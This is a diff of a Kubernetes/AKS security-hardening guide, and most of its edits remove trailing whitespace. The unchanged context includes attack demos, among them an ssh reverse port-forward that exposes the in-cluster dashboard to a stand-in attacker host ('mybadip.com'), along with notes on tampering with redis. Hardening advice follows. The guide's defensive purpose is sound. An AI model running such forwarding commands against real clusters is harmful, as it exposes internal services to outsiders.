@@ -3,7 +3,7 @@
 References/Sources aggregated will be listed at the bottom of this document.
 
 ## Intro:
-* Practically speaking, we will start by locking down our AKS cluster using a tool called `kube-bench`. `kube-bench` applies a k8s security benchmark (from CIS) against the master and control plane components. It sets specific guidelines that help you secure your cluster setup. 
+* Practically speaking, we will start by locking down our AKS cluster using a tool called `kube-bench`. `kube-bench` applies a k8s security benchmark (from CIS) against the master and control plane components. It sets specific guidelines that help you secure your cluster setup.
 * Once this is complete, we will cover common vulnerability points in kubernetes, why they are vulnerabilities, and how to lock them down.
 * Lastly, we will show demos for attacks that worked, primarily, against k8s v1.7* and lower. Each attack includes code snippets, basic steps, and how to harden these cracks in a default cluster's armor.
 
@@ -71,7 +71,7 @@ Since AKS is managed by Azure, we cannot run `kube-bench` against our master nod
 * For an in-depth guide, go here: https://github.com/aquasecurity/kube-bench
 1. Create an AKS cluster with RBAC enabled.
 2. Use the `kubectl-enter-plugin` (https://github.com/kvaps/kubectl-enter) to enter a worker node `kubectl-enter {node-name}`, or just ssh to a node, open port 22, and assign it a public ip (temporarily, for testing).
-3. Run the CIS benchmark to see what we can improve: 
+3. Run the CIS benchmark to see what we can improve:
 ```
 docker run --rm -v `pwd`:/host aquasec/kube-bench:latest install ./kube-bench node
 ```
@@ -180,7 +180,7 @@ spec:
   template:
     metadata:
       labels:
-        name: privileged        
+        name: privileged
     spec:
       containers:
         - name: pause
@@ -289,12 +289,12 @@ $ kubectl get pods --all-namespaces
 Steps: 1) Curl service DNS, 2) Remote forward port via ssh.
 ```bash
 $ curl -sk https://kubernetes-dashboard.kube-system # => Returns html of k8s dash.
-$ ping kubernetes-dashboard.kube-system # => Gets ip address. 
+$ ping kubernetes-dashboard.kube-system # => Gets ip address.
 $ ssh -R8000:${IP-From-Above}:80 hackerman@mybadip.com # ssh out to mybadip (the attacking system), remote port 8000.
 ```
 
 ### Attack Demo #4 - Access Other Services Inside the Cluster Directly
-Steps: 1) Find redis pod, 2) Connect and tamper. 
+Steps: 1) Find redis pod, 2) Connect and tamper.
 ```bash
 $ kubectl get pods -o wide
 $ kubectl get svc # List ips for running services/redis caches
@@ -390,7 +390,7 @@ $ curl -sLO https://storage.googleapis.com/kubernetes-release/release/$(curl -s 
     * 1.8+ - NetworkPolicy
 * Attacks 5-6 - Protect the Kubelet API
 ```bash
-$ cat kubelete.service # => 
+$ cat kubelete.service # =>
 /user/local/bin/kubelet
   --anonymouse-auth=false
   --authorization-mode=Webhook
@@ -414,7 +414,7 @@ spec:
       app: azure-vote-back
     ingress:
     - from:
-      - podSelector: 
+      - podSelector:
           matchLabels:
             k8sApp: azure-vote-front
   policyTypes:
@@ -453,7 +453,7 @@ metadata:
 spec:
   podSelector: {} # Selects all pods in this namespace
   egress: # Egress only allows outbound dns requests to the kube-dns pods.
-  - to: 
+  - to:
     - podSelector:
         matchLabels:
           k8s-app: kube-dns
@@ -464,8 +464,6 @@ spec:
   - Ingress
   - Egress
 ```
-* **General Hardening Tips**
-  * 
 
 ## Sources:
 * https://github.com/freach/kubernetes-security-best-practice
